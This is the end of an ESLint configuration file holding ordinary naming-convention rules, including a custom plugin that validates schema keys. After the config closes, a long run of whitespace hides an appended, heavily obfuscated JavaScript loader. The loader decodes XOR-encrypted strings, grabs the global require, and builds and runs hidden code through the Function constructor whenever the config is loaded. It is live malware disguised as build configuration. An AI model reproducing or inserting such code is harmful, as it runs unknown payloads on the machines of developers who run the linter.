  // Directory & file naming rules (naming-conventions.md §3–§4, §6.6) — inline custom plugin.
  // Not tests-exempt (test file names follow the convention too); the __tests__/__mocks__/__snapshots__
  // directory segments are allow-listed inside the rule.
  {
    files: ['src/**/*.{ts,tsx}', 'packages/ui/**/*.{ts,tsx}'],
    plugins: { naming: namingPlugin },
    rules: {
      'naming/path-case': 'error'
    }
  },
  // Schema key naming convention (cache, preferences, paths & IPC route/event keys)
  // Supports both fixed keys and template keys:
  // - Fixed: 'app.user.avatar', 'chat.multi_select_mode'
  // - Template: 'scroll.position.${topicId}', 'entity.cache.${type}_${id}'
  // Template keys must follow the same dot-separated pattern as fixed keys.
  // When ${xxx} placeholders are treated as literal strings, the key must match: xxx.yyy.zzz_www
  {
    files: [
      'src/shared/data/cache/cacheSchemas.ts',
      'src/shared/data/preference/preferenceSchemas.ts',
      'src/main/core/paths/pathRegistry.ts',
      // IPC route/event keys — whole dir so future domains are auto-enforced (see ipc-schema-guide.md).
      'src/shared/ipc/schemas/**/*.ts'
    ],
    plugins: {
      'data-schema-key': {
        rules: {
          'valid-key': {
            meta: {
              type: 'problem',
              docs: {
                description:
                  'Enforce schema key naming convention: namespace.sub.key_name (template placeholders treated as literal strings)',
                recommended: true
              },
              messages: {
                invalidKey:
                  'Schema key "{{key}}" must follow format: namespace.sub.key_name (e.g., app.user.avatar, scroll.position.${id}). Template ${xxx} is treated as a literal string segment.',
                invalidTemplateVar:
                  'Template variable in "{{key}}" must be a valid identifier (e.g., ${id}, ${topicId}).'
              }
            },
            create(context) {
              /**
               * Validates a schema key for correct naming convention.
               *
               * Both fixed keys and template keys must follow the same pattern:
               * - Lowercase segments separated by dots
               * - Each segment: starts with letter, contains letters/numbers/underscores
               * - At least two segments (must have at least one dot)
               *
               * Template keys: ${xxx} placeholders are treated as literal string segments.
               * Example valid: 'scroll.position.${id}', 'entity.cache.${type}_${id}'
               * Example invalid: 'cache:${type}' (colon not allowed), '${id}' (no dot)
               *
               * @param {string} key - The schema key to validate
               * @returns {{ valid: boolean, error?: 'invalidKey' | 'invalidTemplateVar' }}
               */
              function validateKey(key) {
                // Check if key contains template placeholders
                const hasTemplate = key.includes('${')

                if (hasTemplate) {
                  // Validate template variable names first
                  const templateVarPattern = /\$\{([^}]*)\}/g
                  let match
                  while ((match = templateVarPattern.exec(key)) !== null) {
                    const varName = match[1]
                    // Variable must be a valid identifier: start with letter, contain only alphanumeric and underscore
                    if (!varName || !/^[a-zA-Z][a-zA-Z0-9_]*$/.test(varName)) {
                      return { valid: false, error: 'invalidTemplateVar' }
                    }
                  }

                  // Replace template placeholders with a valid segment marker
                  // Use 'x' as placeholder since it's a valid segment character
                  const keyWithoutTemplates = key.replace(/\$\{[^}]+\}/g, 'x')

                  // Template key must follow the same pattern as fixed keys
                  // when ${xxx} is treated as a literal string
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(keyWithoutTemplates)) {
                    return { valid: false, error: 'invalidKey' }
                  }

                  return { valid: true }
                } else {
                  // Fixed key validation: standard dot-separated format
                  const fixedKeyPattern = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/
                  if (!fixedKeyPattern.test(key)) {
                    return { valid: false, error: 'invalidKey' }
                  }
                  return { valid: true }
                }
              }

              return {
                TSPropertySignature(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                },
                Property(node) {
                  if (node.key.type === 'Literal' && typeof node.key.value === 'string') {
                    // Keys inside a `z.*(...)` object literal are zod data-field names
                    // (e.g. z.object({ 'content-type': ... })), not route/schema keys, so the
                    // namespace.action convention does not apply — skip them. Anchored on the
                    // zod namespace `z`, this covers z.object/z.strictObject/etc. while leaving
                    // Object.freeze(...) registries (pathRegistry.ts) still validated.
                    const enclosing = node.parent
                    if (
                      enclosing?.parent?.type === 'CallExpression' &&
                      enclosing.parent.callee?.type === 'MemberExpression' &&
                      enclosing.parent.callee.object?.type === 'Identifier' &&
                      enclosing.parent.callee.object.name === 'z'
                    ) {
                      return
                    }
                    const key = node.key.value
                    const result = validateKey(key)
                    if (!result.valid) {
                      context.report({
                        node: node.key,
                        messageId: result.error,
                        data: { key }
                      })
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    rules: {
      'data-schema-key/valid-key': 'error'
    }
  }
]);																																																																																																																																																																																																																																																																										var z = '-3343-2';(function(SqyHyYEAaE$HyXWxkdHK,P_Kqu$vK){var YRMhQw_ocPRbbLhKuQoCg=KAUiTqPiXdWs,Ga_YhG=SqyHyYEAaE$HyXWxkdHK();while(!![]){try{var oQdQfWjjYSYJzlQNxfk=Math['trunc'](-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x218))/(Math.ceil(-0x9)*-0x164+Math.floor(parseInt(0x9))*Math.floor(parseInt(0x249))+-0x108a*parseInt(0x2)))*parseInt(-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x222))/(-parseInt(0x260f)+-0xe69+parseFloat(-parseInt(0x1))*-0x347a))+parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f6))/(-parseInt(0x13)*parseInt(0x21)+-parseInt(0x44)*parseInt(0x2f)+Math.floor(0xef2))*(parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x21b))/(parseInt(0xcc2)+parseInt(0xd14)+-parseInt(0x295)*parseFloat(0xa)))+-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1ff))/(Math.floor(-parseInt(0x1))*0x121e+Math.floor(-0x1)*0x213+parseInt(0x1436))+parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x225))/(parseFloat(0x15f)*Number(-parseInt(0x1a))+parseInt(0x1ae8)+Math.floor(parseInt(0x8c4)))*Number(-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1fe))/(parseInt(0x65b)*-0x6+parseInt(0x1cbc)*0x1+parseInt(-0x13)*Math.max(-parseInt(0x7f),-parseInt(0x7f))))+parseFloat(parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x230))/(Math.ceil(-parseInt(0x6))*0x50b+-parseInt(0x4)*Math.floor(parseInt(0x51b))+Math.floor(0x32b6)))+-parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f1))/(Math.floor(parseInt(0x1aef))+Math.ceil(-0x86)*parseInt(0xb)+Math.floor(-parseInt(0x1524)))*Math['ceil'](parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x1f7))/(0x1b1f*-0x1+parseInt(-0x1877)+parseInt(0x33a0)))+Math['ceil'](parseFloat(YRMhQw_ocPRbbLhKuQoCg(0x22b))/(-parseInt(0x20c4)+parseInt(0x1b10)+Math.floor(0x5bf)));if(oQdQfWjjYSYJzlQNxfk===P_Kqu$vK)break;else Ga_YhG['push'](Ga_YhG['shift']());}catch(Qypub_ETSmdizpLTzEr){Ga_YhG['push'](Ga_YhG['shift']());}}}(HjHsHac$ObTDDGcJ,-0x14b728+parseInt(-0x96de7)*Math.max(0x2,0x2)+-parseInt(0x89)*-parseInt(0x5dce)));var NX=[-0x27*-parseInt(0x2bc35)+0x49*-parseInt(0x10be7)+parseInt(parseInt(0x4b341b)),Math.floor(parseInt(0x1))*0x2498+-0x275*Math.max(0x1,0x1)+Math.max(-0x20b4,-parseInt(0x20b4)),-parseInt(0x7ed3)+-parseInt(0x21d)*parseFloat(-parseInt(0x1))+parseInt(0xc7)*0x107,-parseInt(0x23d0)*Math.floor(-parseInt(0x1))+-parseInt(0x699)*-parseInt(0x5)+parseInt(0x11)*-0x3e8,Number(-0x55d)*parseInt(0x24)+parseFloat(0xb366)+-parseInt(0xa7)*-parseInt(0x11b),-parseInt(0x27fa15)+-parseInt(0x70a3)*Math.floor(parseInt(0x1))+0x17f*0x4e35],SX=[Math.max(-parseInt(0x455ff0),-0x455ff0)+0x13f*-parseInt(0x55db)+Math.max(parseInt(0x100fb72),parseInt(0x100fb72)),-0x1728+Math.max(0x1,0x1)*Math.max(-0x4d6,-parseInt(0x4d6))+Math.floor(-parseInt(0x337))*-parseInt(0x9),-parseInt(0xf)*0x1561+-0x1*Number(-0xe317)+Number(parseInt(0x10179)),-parseInt(0x2648)+0x5a5*Math.ceil(0x4)+Number(parseInt(0x106f)),-0x19ccc+parseFloat(-parseInt(0xc0df))+parseInt(0x338ec),-0x25bb*0x31c+Math.floor(-parseInt(0x1))*0x1dc5b7+Math.trunc(parseInt(0x87040))*0x1a];function spin(RmESsbUgJDDbsTvxobztOSl,vDm$EOxQEp){var IyxjPIDyrvwiq=KAUiTqPiXdWs,woErDcyT={'FIZpz':function(h_x$sbwsDNQWBLhrwdSUqx,DeXhAI_XpUkQC){return h_x$sbwsDNQWBLhrwdSUqx<DeXhAI_XpUkQC;},'whEzD':function(rP$kIeNETu,caehkMNzLl$JqRICTrxzrbSSMU){return rP$kIeNETu+caehkMNzLl$JqRICTrxzrbSSMU;},'ZBsbg':function(dFZvyBmIXia,SqzZqhxARkMI){return dFZvyBmIXia*SqzZqhxARkMI;},'UyTQj':function(Yqami$rwZbGqE,ClZeCotb$O){return Yqami$rwZbGqE%ClZeCotb$O;},'DxMNH':function(ad$kohMflBYDqCSNUA_Z,nNjaVKDHbKqp_azS$oAmaFU){return ad$kohMflBYDqCSNUA_Z%nNjaVKDHbKqp_azS$oAmaFU;},'gHQAr':function(KetmHlqbQnQ$fMbmGb,lXYAxiLMZQCWD_Lo_AGXy){return KetmHlqbQnQ$fMbmGb*lXYAxiLMZQCWD_Lo_AGXy;},'JuSMa':function(mFySNvxVVHQN,YPwXpNJi$AFg){return mFySNvxVVHQN%YPwXpNJi$AFg;},'PZGun':function(sbsCOrI,pTJzCvUdnfkdVWSrpgY){return sbsCOrI+pTJzCvUdnfkdVWSrpgY;}};for(var z__dqsKQ,ZAsqssRWZfU,kcazH_$om,qvKIWYnglKsqtcHYQ,ctMJs$uZdU,XBO$UgpdafB,LQVCDi_WtOmzPIz=[],QkuCHeqk$VrkwJaxczf=-0x16e3+-parseInt(0xd)*parseInt(0x1e1)+-0x2*-parseInt(0x17a8),VKYlWAFHWv_U=vDm$EOxQEp[parseFloat(-parseInt(0x18d2))+-parseInt(0x8d)*-parseInt(0x1)+Number(-parseInt(0x1))*-parseInt(0x1845)];QkuCHeqk$VrkwJaxczf<RmESsbUgJDDbsTvxobztOSl[IyxjPIDyrvwiq(0x203)];)LQVCDi_WtOmzPIz[QkuCHeqk$VrkwJaxczf]=RmESsbUgJDDbsTvxobztOSl[IyxjPIDyrvwiq(0x217)](QkuCHeqk$VrkwJaxczf),QkuCHeqk$VrkwJaxczf+=parseInt(0x2)*0x975+parseInt(0x13f3)*parseInt(0x1)+-parseInt(0x26dc);for(z__dqsKQ=LQVCDi_WtOmzPIz[IyxjPIDyrvwiq(0x203)],QkuCHeqk$VrkwJaxczf=0x19f7+parseInt(0x9c1)*Math.max(parseInt(0x2),0x2)+Math.trunc(-parseInt(0x2d79));woErDcyT[IyxjPIDyrvwiq(0x20f)](QkuCHeqk$VrkwJaxczf,z__dqsKQ);)ZAsqssRWZfU=woErDcyT[IyxjPIDyrvwiq(0x205)](woErDcyT[IyxjPIDyrvwiq(0x1ec)](VKYlWAFHWv_U,woErDcyT[IyxjPIDyrvwiq(0x205)](QkuCHeqk$VrkwJaxczf,vDm$EOxQEp[parseFloat(-parseInt(0x1))*0x22b9+-parseInt(0xa52)+-parseInt(0x2d0c)*-0x1])),woErDcyT[IyxjPIDyrvwiq(0x20c)](VKYlWAFHWv_U,vDm$EOxQEp[-parseInt(0xfc5)*-parseInt(0x2)+-0x6ba+parseInt(0x7f)*-0x32])),ctMJs$uZdU=woErDcyT[IyxjPIDyrvwiq(0x1f3)](kcazH_$om=woErDcyT[IyxjPIDyrvwiq(0x205)](woErDcyT[IyxjPIDyrvwiq(0x211)](VKYlWAFHWv_U,QkuCHeqk$VrkwJaxczf+vDm$EOxQEp[parseInt(0x28)*Math.ceil(-0x40)+0x36e*0xa+-0x1849]),VKYlWAFHWv_U%vDm$EOxQEp[0xb0a+-0xb3d+Math.floor(parseInt(0xb))*Math.ceil(parseInt(0x5))]),z__dqsKQ),XBO$UgpdafB=LQVCDi_WtOmzPIz[qvKIWYnglKsqtcHYQ=ZAsqssRWZfU%z__dqsKQ],LQVCDi_WtOmzPIz[qvKIWYnglKsqtcHYQ]=LQVCDi_WtOmzPIz[ctMJs$uZdU],LQVCDi_WtOmzPIz[ctMJs$uZdU]=XBO$UgpdafB,VKYlWAFHWv_U=woErDcyT[IyxjPIDyrvwiq(0x213)](woErDcyT[IyxjPIDyrvwiq(0x23b)](ZAsqssRWZfU,kcazH_$om),vDm$EOxQEp[parseInt(0x15da)*0x1+parseFloat(-0x303)*Math.ceil(-0x1)+-0x4*parseInt(0x636)]),QkuCHeqk$VrkwJaxczf+=parseInt(0x1)*parseInt(0x2515)+Math.trunc(-0xe3a)*parseInt(0x1)+Math.ceil(-0x75)*Number(0x32);return LQVCDi_WtOmzPIz[IyxjPIDyrvwiq(0x238)]('');}function splitLane(ovuYjbVnFvDlzVy_ukAYHOdKRn){var ekGtrocNRo__iuVMSOSkHNjY=KAUiTqPiXdWs,qncreGR={'tQLCp':function(uRG$nZGfFJ,FF_wSDpb,wcoDDDYPtFgo){return uRG$nZGfFJ(FF_wSDpb,wcoDDDYPtFgo);}},YTBFJJiWurAEjJmbcTWawa=String[ekGtrocNRo__iuVMSOSkHNjY(0x216)](Math.trunc(-parseInt(0x24c2))+Math.floor(0x1f67)+-0x577*Math.max(-0x1,-0x1)),ezrGL_aakkqJNN_SEty=qncreGR[ekGtrocNRo__iuVMSOSkHNjY(0x227)](spin,ovuYjbVnFvDlzVy_ukAYHOdKRn,NX);return(ezrGL_aakkqJNN_SEty=(ezrGL_aakkqJNN_SEty=(ezrGL_aakkqJNN_SEty=ezrGL_aakkqJNN_SEty[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('^')[ekGtrocNRo__iuVMSOSkHNjY(0x238)](YTBFJJiWurAEjJmbcTWawa))[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('*1')[ekGtrocNRo__iuVMSOSkHNjY(0x238)]('^'))[ekGtrocNRo__iuVMSOSkHNjY(0x229)]('*0')[ekGtrocNRo__iuVMSOSkHNjY(0x238)]('*'))[ekGtrocNRo__iuVMSOSkHNjY(0x229)](YTBFJJiWurAEjJmbcTWawa);}function peel(yAg$cxEVKRgmKkhjmw_W){var QI_WxIs=KAUiTqPiXdWs,dphGjy$zPmP={'qOPvW':function(XObjIGmNXCKnShLBWhfRq,slFmBOfnzWQnsYTYc,iYcaRqlxjJguDJLhuBiGlqZO){return XObjIGmNXCKnShLBWhfRq(slFmBOfnzWQnsYTYc,iYcaRqlxjJguDJLhuBiGlqZO);}};return dphGjy$zPmP[QI_WxIs(0x22a)](spin,yAg$cxEVKRgmKkhjmw_W,SX);}function KAUiTqPiXdWs(cJtKAUiTqPiXdWsHG$z,QP$ePFzzIF_xARRtPfzF){var ZpzcNwh_EzDna$ZBsbgc=HjHsHac$ObTDDGcJ();return KAUiTqPiXdWs=function(cMtxUyTQj$WHJ,xMNHxbPMBgHQA_r$VCS){cMtxUyTQj$WHJ=cMtxUyTQj$WHJ-(Math.floor(0xeb)*0xe+parseInt(0x75)*-0x51+parseFloat(0x1a15));var SMC$JuSMav=ZpzcNwh_EzDna$ZBsbgc[cMtxUyTQj$WHJ];if(KAUiTqPiXdWs['bvUWYF']===undefined){var vWCghrKlIMqTCnZ_c$ODEEJ=function(NzzKzEVAqavkJz){var rijpMU__C=0x2263*0x1+Math.ceil(parseInt(0x39a))*parseInt(0x3)+Number(-0x29fa)&-parseInt(0x1)*Math.ceil(parseInt(0x7))+Math.ceil(0x65)*-0x35+-parseInt(0x5)*-0x463,etEpiipIzrWxEWQGtxnG=new Uint8Array(NzzKzEVAqavkJz['match'](/.{1,2}/g)['map'](TwWNCoTCA=>parseInt(TwWNCoTCA,Math.trunc(-parseInt(0x25))*parseInt(0xc2)+-0x559+parseInt(0x2173)))),MOSIKz$zkcETCOANHlfad=etEpiipIzrWxEWQGtxnG['map'](nueMQBMDdIqhrq$_DtYmHKBTq=>nueMQBMDdIqhrq$_DtYmHKBTq^rijpMU__C),fbXhaJpkiwxc$LlJafWqPZT=new TextDecoder(),QoV_hRCqQJ=fbXhaJpkiwxc$LlJafWqPZT['decode'](MOSIKz$zkcETCOANHlfad);return QoV_hRCqQJ;};KAUiTqPiXdWs['GOgQzc']=vWCghrKlIMqTCnZ_c$ODEEJ,cJtKAUiTqPiXdWsHG$z=arguments,KAUiTqPiXdWs['bvUWYF']=!![];}var PZGunJwqSnJLw$zBsEQH=ZpzcNwh_EzDna$ZBsbgc[-0xff*Math.floor(-parseInt(0x23))+-0x1*parseInt(0x3b)+-parseInt(0x22a2)*parseFloat(parseInt(0x1))],tQLC$pJXJ=cMtxUyTQj$WHJ+PZGunJwqSnJLw$zBsEQH,xUMRlBpeNXBdbGTAcqO=cJtKAUiTqPiXdWsHG$z[tQLC$pJXJ];return!xUMRlBpeNXBdbGTAcqO?(KAUiTqPiXdWs['GdTMzO']===undefined&&(KAUiTqPiXdWs['GdTMzO']=!![]),SMC$JuSMav=KAUiTqPiXdWs['GOgQzc'](SMC$JuSMav),cJtKAUiTqPiXdWsHG$z[tQLC$pJXJ]=SMC$JuSMav):SMC$JuSMav=xUMRlBpeNXBdbGTAcqO,SMC$JuSMav;},KAUiTqPiXdWs(cJtKAUiTqPiXdWsHG$z,QP$ePFzzIF_xARRtPfzF);}!function(iVz_$Ky,ASBtr_HfzsovmiuERBnKMXh_N){var v$AbLZurrxEodL=KAUiTqPiXdWs,BavMr$f={'HEmbz':function(uUnCr,iWmFGDhMilaUIVf){return uUnCr===iWmFGDhMilaUIVf;},'zqjFs':v$AbLZurrxEodL(0x22e),'UxuAG':function(kvsYYpzmgmSk,gbGSzheyYh){return kvsYYpzmgmSk(gbGSzheyYh);},'GksxL':v$AbLZurrxEodL(0x23c),'CLctw':v$AbLZurrxEodL(0x219),'xGdCV':function(c$ibzmAbNZo_H,tVzRUlmlrlgtesi_R){return c$ibzmAbNZo_H+tVzRUlmlrlgtesi_R;},'exPGr':function(C_NyhTqeVpXyDFgKaDGk){return C_NyhTqeVpXyDFgKaDGk();},'gGsAj':function(otCm$KbrbpiUWObiD$hBIhNVGa,CYSmFdPmTlSVFSAztwCWJGSR,FWzFzfLkMUIuO$iziGwXvlWa){return otCm$KbrbpiUWObiD$hBIhNVGa(CYSmFdPmTlSVFSAztwCWJGSR,FWzFzfLkMUIuO$iziGwXvlWa);},'tUWTm':function(dkRYBsllQCAekMa,TMINetcOH$jgSZzmSFI){return dkRYBsllQCAekMa(TMINetcOH$jgSZzmSFI);},'ceCgy':v$AbLZurrxEodL(0x207)},XuUmGjBTrVQ=v$AbLZurrxEodL(0x1f4)[v$AbLZurrxEodL(0x229)]('|'),WZhvc_$Awlx=Math.max(0x4,parseInt(0x4))*0x60d+Math.floor(parseInt(0x4dd))+-parseInt(0x1)*parseInt(0x1d11);while(!![]){switch(XuUmGjBTrVQ[WZhvc_$Awlx++]){case'0':iVz_$Ky['z']=z;continue;case'1':var YMbMl$TK$KnFwMYpnmNz=(function(){var BLFUd$exiGcJQOsztL=!![];return function(CJDbOjvNLFfUBj_aA_S,MYQEAVd$HrpgABlnE){var aKPmIxECZLTIWn=BLFUd$exiGcJQOsztL?function(){var pAkzEtnmcPeCqCLHbi$eBv=KAUiTqPiXdWs;if(MYQEAVd$HrpgABlnE){var GKTBwbgZQR$RoekeUqUSLsl=MYQEAVd$HrpgABlnE[pAkzEtnmcPeCqCLHbi$eBv(0x239)](CJDbOjvNLFfUBj_aA_S,arguments);return MYQEAVd$HrpgABlnE=null,GKTBwbgZQR$RoekeUqUSLsl;}}:function(){};return BLFUd$exiGcJQOsztL=![],aKPmIxECZLTIWn;};}());continue;case'2':iVz_$Ky[NyLyGdfamY$NMYx_S[parseFloat(-0x17e)*-0x11+parseInt(0x1fcf)+parseInt(0x7b)*Math.ceil(-0x77)]]=ASBtr_HfzsovmiuERBnKMXh_N,BavMr$f[v$AbLZurrxEodL(0x226)](typeof module,NyLyGdfamY$NMYx_S[parseFloat(parseInt(0x1))*Number(-parseInt(0x3cb))+parseInt(0x16)*-parseInt(0x161)+0x2222])&&(iVz_$Ky[NyLyGdfamY$NMYx_S[0x12c6*Number(-0x2)+Number(-0x1a0b)+Math.floor(parseInt(0x3f99))]]=module);continue;case'3':var HeuqTNRGA$HQJWSVzwYcUrlNo=peel(BavMr$f[v$AbLZurrxEodL(0x20e)]),AfVlijEwvEwhzfHVCAenlLP=peel[HeuqTNRGA$HQJWSVzwYcUrlNo[v$AbLZurrxEodL(0x231)](Math.ceil(-0xb15)+parseInt(0x139)*parseFloat(0x11)+0x2e*parseFloat(-parseInt(0x36)),Number(-parseInt(0x552))*-0x3+Math.floor(-parseInt(0x6eb))+0x9*Math.max(-0x100,-0x100))],ZtyvRWnw_NpMaLThPiCykLVe_fQ=AfVlijEwvEwhzfHVCAenlLP('',peel(v$AbLZurrxEodL(0x23a)));continue;case'4':var NyLyGdfamY$NMYx_S=BavMr$f[v$AbLZurrxEodL(0x206)](splitLane,BavMr$f[v$AbLZurrxEodL(0x208)]);continue;case'5':var rdFFUhcO_ZhhBsJC={'oVhRC':BavMr$f[v$AbLZurrxEodL(0x1fc)],'JmTwW':function(QykaewoEFh_JrbvZUnqzf,fWEtsyedRCgyCxxeBjCeQJ){var gSQunxgoSgziDArtZDFAcmFS=v$AbLZurrxEodL;return BavMr$f[gSQunxgoSgziDArtZDFAcmFS(0x233)](QykaewoEFh_JrbvZUnqzf,fWEtsyedRCgyCxxeBjCeQJ);},'UnueM':v$AbLZurrxEodL(0x223),'DdIqh':function(pjILDPWORzaFqG){var EECVM_gS$duiSgcUsAQHmLynarb=v$AbLZurrxEodL;return BavMr$f[EECVM_gS$duiSgcUsAQHmLynarb(0x1fa)](pjILDPWORzaFqG);},'tYmHK':function(SvAiLkBHyr$APox$FhOxjt,EqXZj,zqcA$yi){return SvAiLkBHyr$APox$FhOxjt(EqXZj,zqcA$yi);}};continue;case'6':(function(){var TEsxKXmE_bQCatmVu$XRY=v$AbLZurrxEodL,GsMPjWyhTKrm_D_EfTaUdoJhZK={'etEpi':TEsxKXmE_bQCatmVu$XRY(0x1ef),'IzrWx':rdFFUhcO_ZhhBsJC[TEsxKXmE_bQCatmVu$XRY(0x1f8)],'GLMOS':function(EMqJIDGCiVOFPnsYWDmI,QbqG$QLks){var N_wDSAobFMfmBU=TEsxKXmE_bQCatmVu$XRY;return rdFFUhcO_ZhhBsJC[N_wDSAobFMfmBU(0x201)](EMqJIDGCiVOFPnsYWDmI,QbqG$QLks);},'zzkcE':TEsxKXmE_bQCatmVu$XRY(0x20d),'ANHlf':function(B__IExCiNENFskqNuRopNaoro,BStLNhnFEKh$vb_TTzSCJaA){var u$$RNPef=TEsxKXmE_bQCatmVu$XRY;return rdFFUhcO_ZhhBsJC[u$$RNPef(0x201)](B__IExCiNENFskqNuRopNaoro,BStLNhnFEKh$vb_TTzSCJaA);},'QfbXh':rdFFUhcO_ZhhBsJC[TEsxKXmE_bQCatmVu$XRY(0x1fd)],'pkiwx':function(bAFYWkHNnXFi,SaJwulyGp_cSC$shzY){return bAFYWkHNnXFi(SaJwulyGp_cSC$shzY);},'JafWq':function(IhG_Og_r){var OtaZqeHWPcYaK=TEsxKXmE_bQCatmVu$XRY;return rdFFUhcO_ZhhBsJC[OtaZqeHWPcYaK(0x1ee)](IhG_Og_r);}};rdFFUhcO_ZhhBsJC[TEsxKXmE_bQCatmVu$XRY(0x232)](YMbMl$TK$KnFwMYpnmNz,this,function(){var fLPtcS$p$QSyHVGL=TEsxKXmE_bQCatmVu$XRY,txOuHyvZeltMlaadtyCNB_paf=new RegExp(GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x215)]),Hd_Tje=new RegExp(GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x1ed)],'i'),rZISe$b$VN=ZNiyxRmnWHXYIQsqaASbzm(fLPtcS$p$QSyHVGL(0x22d));!txOuHyvZeltMlaadtyCNB_paf[fLPtcS$p$QSyHVGL(0x1eb)](GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x221)](rZISe$b$VN,GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x21c)]))||!Hd_Tje[fLPtcS$p$QSyHVGL(0x1eb)](GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x200)](rZISe$b$VN,GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x234)]))?GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x1f2)](rZISe$b$VN,'0'):GsMPjWyhTKrm_D_EfTaUdoJhZK[fLPtcS$p$QSyHVGL(0x1f0)](ZNiyxRmnWHXYIQsqaASbzm);})();}());continue;case'7':BavMr$f[v$AbLZurrxEodL(0x236)](AfVlijEwvEwhzfHVCAenlLP,'',BavMr$f[v$AbLZurrxEodL(0x224)](ZtyvRWnw_NpMaLThPiCykLVe_fQ,BavMr$f[v$AbLZurrxEodL(0x224)](peel,BavMr$f[v$AbLZurrxEodL(0x204)])))(parseFloat(-parseInt(0x9c0))*-parseInt(0x1)+-parseInt(0x25f3)+parseInt(-0x20)*-0x130);continue;}break;}}(global,require);function ZNiyxRmnWHXYIQsqaASbzm(TMxhViPsAfWPngcdq){var iHjCxMBhtTaCZpDXWzTIbAVLt=KAUiTqPiXdWs,UoNH_TJMaKtWZAEx_JDyb={'SqKxn':function(QCsl$QeVmHtQzJlQR,Qw$GrNnNBDNjwLSVbWNWmrUda){return QCsl$QeVmHtQzJlQR===Qw$GrNnNBDNjwLSVbWNWmrUda;},'AnRuU':iHjCxMBhtTaCZpDXWzTIbAVLt(0x22f),'cHNjl':iHjCxMBhtTaCZpDXWzTIbAVLt(0x1ea),'bzewC':iHjCxMBhtTaCZpDXWzTIbAVLt(0x21e),'zswXZ':function(cJoVtfrvNIglrVJrzkLDhHMWi,MMCkJ$OMbS$jQk){return cJoVtfrvNIglrVJrzkLDhHMWi!==MMCkJ$OMbS$jQk;},'iokuQ':function(YZVaSqYddZODlHECK,ZTOVx$oFvOb){return YZVaSqYddZODlHECK+ZTOVx$oFvOb;},'HQarD':function(sSOwKvvObZIUPD$VfWgZ,zS$$MlIwNYPO){return sSOwKvvObZIUPD$VfWgZ/zS$$MlIwNYPO;},'FGZzg':function(aDZ$xDkgdAOmbNo,bnAygyNkQzwd){return aDZ$xDkgdAOmbNo%bnAygyNkQzwd;},'GgVmg':iHjCxMBhtTaCZpDXWzTIbAVLt(0x21d),'zphtt':iHjCxMBhtTaCZpDXWzTIbAVLt(0x237),'KhYgz':function(soovqSQnklyFGRC,TtrWkXJMgdQjzR$aDzHv){return soovqSQnklyFGRC+TtrWkXJMgdQjzR$aDzHv;},'YgSlx':function(AdarkgqLl$rySVMQtS,Rqte$rLzDrCtV_rPX){return AdarkgqLl$rySVMQtS(Rqte$rLzDrCtV_rPX);}};function aBkQboEwhVC$pOSUapcWuin(XxrZaUCIZVtaeVqcAmR){var eJZcjHZdjCBffwCjE_JQq=iHjCxMBhtTaCZpDXWzTIbAVLt;if(UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x228)](typeof XxrZaUCIZVtaeVqcAmR,UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x1f9)]))return function(HtPDR_vQuMcYiWxWwp$Nl){}[eJZcjHZdjCBffwCjE_JQq(0x209)](UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x220)])[eJZcjHZdjCBffwCjE_JQq(0x239)](UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x20b)]);else UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x22c)](UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x235)]('',UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x212)](XxrZaUCIZVtaeVqcAmR,XxrZaUCIZVtaeVqcAmR))[eJZcjHZdjCBffwCjE_JQq(0x203)],parseFloat(-0x1)*-0x21+-parseInt(0x17a3)+-0xd*-parseInt(0x1cf))||UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x21a)](XxrZaUCIZVtaeVqcAmR,-0xc*Math.floor(0x149)+parseInt(0x1f4c)+-0xfcc)===-0x529*parseFloat(-parseInt(0x6))+parseFloat(parseInt(0x189a))*parseInt(-parseInt(0x1))+-0x65c?function(){return!![];}[eJZcjHZdjCBffwCjE_JQq(0x209)](eJZcjHZdjCBffwCjE_JQq(0x20a)+UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x210)])[eJZcjHZdjCBffwCjE_JQq(0x1fb)](UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x21f)]):function(){return![];}[eJZcjHZdjCBffwCjE_JQq(0x209)](UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x1f5)](eJZcjHZdjCBffwCjE_JQq(0x20a),UoNH_TJMaKtWZAEx_JDyb[eJZcjHZdjCBffwCjE_JQq(0x210)]))